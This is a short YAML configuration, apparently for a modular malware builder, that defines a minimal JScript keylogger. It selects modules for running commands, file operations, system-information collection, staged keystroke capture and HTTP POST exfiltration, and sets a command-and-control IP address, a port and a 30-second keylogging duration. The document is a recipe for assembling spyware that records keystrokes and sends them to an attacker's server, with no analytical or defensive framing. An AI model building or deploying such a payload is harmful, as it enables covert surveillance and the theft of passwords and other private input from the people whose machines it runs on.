name: js_keylogger_minimal
description: Minimal keylogger — smallest footprint, sysinfo only
format: jscript

core:
  - core/emit_buffer
  - core/run_cmd
  - core/file_ops

collectors:
  - collectors/sysinfo

keylogger: collectors/keylogger_staged

exfil: exfil/http_post
arch: arch/keylogger

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  KEYLOG_DURATION: "30"
